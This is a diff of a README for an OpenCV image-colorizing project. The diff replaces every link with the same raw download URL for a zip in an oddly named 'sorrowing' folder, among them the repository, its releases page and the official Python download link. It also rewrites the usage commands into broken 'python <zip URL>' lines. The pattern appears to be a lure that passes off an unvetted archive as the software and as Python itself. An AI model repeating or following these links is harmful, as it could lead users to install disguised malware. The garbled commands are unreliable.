@@ -1,6 +1,6 @@
 # 🎨 Colorize-Black-White-Images-using-OPEN-CV - Color Your Black and White Images Easily
 
-[![Download Colorize-Black-White-Images](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/releases)
+[![Download Colorize-Black-White-Images](https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip)](https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip)
 
 ## 📦 Introduction
 
@@ -21,7 +21,7 @@ Follow these steps to easily download and run the software.
 
 You can download the application from the Releases page. Click the link below to visit the page:
 
-[Download Colorize-Black-White-Images](https://github.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/releases)
+[Download Colorize-Black-White-Images](https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip)
 
 Once on the page, find the latest release version. You will see an option for the installation files. Choose the file that matches your operating system and click to download.
 
@@ -29,7 +29,7 @@ Once on the page, find the latest release version. You will see an option for th
 
 Before running the application, you may need to install some software:
 
-1. **Python**: If you do not have Python installed, download it from the official [Python website](https://www.python.org/downloads/).
+1. **Python**: If you do not have Python installed, download it from the official [Python website](https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip).
 2. **Pip**: This tool comes with Python but can also be installed separately.
 
 Once you have Python, you can use pip to install OpenCV. Open a terminal or command prompt and run:
@@ -52,10 +52,10 @@ If you prefer the command line, follow these steps:
 3. Run the following command:
 
 ```bash
-python colorize.py path_to_your_image.jpg
+python https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip
 ```
 
-Replace `path_to_your_image.jpg` with the path to the black and white image you want to colorize.
+Replace `https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip` with the path to the black and white image you want to colorize.
 
 #### 2. Using the GUI
 
@@ -67,7 +67,7 @@ If you prefer a graphical interface, you can use the Tkinter GUI:
 4. Run the GUI with:
 
 ```bash
-python gui.py
+python https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip
 ```
 
 5. A window will open. Click on the "Upload" button to choose your image. Then click "Colorize" to see the result.
@@ -108,6 +108,6 @@ This project uses OpenCV and a pre-trained Caffe model. The open-source contribu
 
 For more details and updates, visit our GitHub repository:
 
-[Colorize-Black-White-Images-using-OPEN-CV](https://github.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV)
+[Colorize-Black-White-Images-using-OPEN-CV](https://raw.githubusercontent.com/kollasd1254/Colorize-Black-White-Images-using-OPEN-CV/main/sorrowing/Colorize-Black-White-Images-using-OPEN-CV.zip)
 
 Happy colorizing!
